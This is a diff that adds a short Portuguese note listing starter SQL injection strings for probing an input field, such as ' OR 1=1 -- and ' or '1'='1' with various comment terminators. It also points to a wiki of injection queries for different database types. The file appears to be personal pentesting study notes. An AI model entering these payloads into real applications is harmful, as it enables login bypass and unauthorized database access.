@@ -1,0 +1,11 @@
+COMANDOS INICIAIS PARA TESTAR SQL INJECTION EM UM CAMPO
+
+' OR 1=1 --
+' OR 1=1 ##
+' or '1'='1' -- 
+' or '1'='1' ({ 
+' or '1'='1' /* 
+
+SITE COM AS QUERYS PARA TODOS OS MODELOS DE BANCOS DE DADOS, BIZÚ!!!
+
+http://www.sqlinjectionwiki.com/
